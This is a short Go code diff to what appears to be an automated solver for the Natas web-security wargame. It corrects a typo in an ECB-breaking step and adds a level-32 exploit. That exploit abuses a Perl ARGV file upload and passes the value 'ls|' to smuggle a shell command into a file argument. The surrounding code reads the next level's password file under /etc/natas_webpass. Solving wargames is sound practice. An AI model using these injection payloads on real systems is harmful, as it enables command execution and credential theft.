@@ -562,7 +562,7 @@ var levels = [...]Grabber{
 			},
 			SetData{
 				"query": Base64Encode{
-					EBCBreaker{
+					ECBBreaker{
 						&Post{
 							Base64Decode{
 								URLDecode{
@@ -616,6 +616,23 @@ var levels = [...]Grabber{
 				},
 			},
 			Text{url.QueryEscape("/etc/natas_webpass/natas32")},
+		},
+		"<tr><th>",
+		32,
+	},
+	//level 32
+	Prefixed{
+		Query{
+			Post{
+				Debug{grab, ""},
+				SetData{"file": Text{"ARGV"}},
+				&File{
+					Text{"file"},
+					Text{"1"},
+					memio.Buffer("1"),
+				},
+			},
+			Text{url.QueryEscape("ls|")},
 		},
 		"<tr><th>",
 		32,
